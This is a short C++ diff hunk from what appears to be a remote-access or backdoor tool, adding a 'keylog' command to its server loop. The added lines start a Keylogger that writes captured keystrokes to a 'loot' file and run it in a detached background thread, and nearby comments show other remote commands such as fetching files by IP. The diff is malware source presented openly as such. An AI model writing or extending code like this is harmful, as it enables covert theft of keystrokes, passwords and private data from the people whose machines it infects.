@@ -242,7 +242,11 @@ int serverMode(const Properties &p) {
         }
 
         // format: keylog [ip]
+        // Starts the keylogger in another thread and detaches
         if (tokens[0] == "keylog") {
+            Keylogger kl(p.at("keylogLootFile"));
+            std::thread kl_thread(kl.start_logging);
+            kl_thread.detach();
         }
 
         // format: get [ip] [file]
